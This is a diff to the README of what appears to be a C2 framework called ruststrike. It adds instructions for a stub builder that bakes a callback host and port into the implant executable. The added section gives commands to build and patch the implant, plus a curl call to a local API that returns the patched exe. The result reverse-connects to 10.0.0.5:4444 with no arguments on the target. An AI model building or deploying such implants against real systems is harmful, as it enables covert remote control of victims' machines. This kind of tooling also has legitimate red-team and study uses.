@@ -124,6 +124,32 @@ smoke: `./target/release/ruststrike-server.exe 4444`, then `hello` /
 `load examples/hello.x64.o` / `loadb examples/cmd_exec.x64.o examples/cmd_args.bin`
 at its console.
 
+## Implant stub builder (dynamic callback address/port)
+
+The implant reads its callback host/port from an **appended-config trailer** on
+its own exe at startup (else falls back to CLI args). This lets you deploy ONE
+patched binary per target with a baked-in callback — no args on the target.
+
+Trailer layout (appended to the exe bytes):
+`<exe>... "RUSTSTRIKE\x01" <host> "\x00" <port> "\x00"`
+
+Two ways to patch a base `ruststrike-implant.exe`:
+
+```sh
+# CLI tool
+cd tools/stubbuilder && go build -o stubbuilder.exe .
+./stubbuilder.exe ../../target/release/ruststrike-implant.exe out.exe 10.0.0.5 4444
+# out.exe now reverse-connects to 10.0.0.5:4444 with no args
+
+# or via the Go core REST (used by the GUI's Generate Agent button)
+curl -X POST "http://127.0.0.1:8091/api/stub/build" \
+  -H 'Content-Type: application/json' -d '{"host":"10.0.0.5","port":"4444"}'
+# -> {"exe_b64":"..."}  (base64-decode to the patched exe)
+```
+
+Re-patching an already-patched exe strips the old trailer first (no
+accumulation). The trailer is host:port only for v1 (no sleep/jitter/SSL yet).
+
 ## v1 limitations
 
 - `BeaconPrintf` only captures the first two variadic arguments (x64 r8/r9).
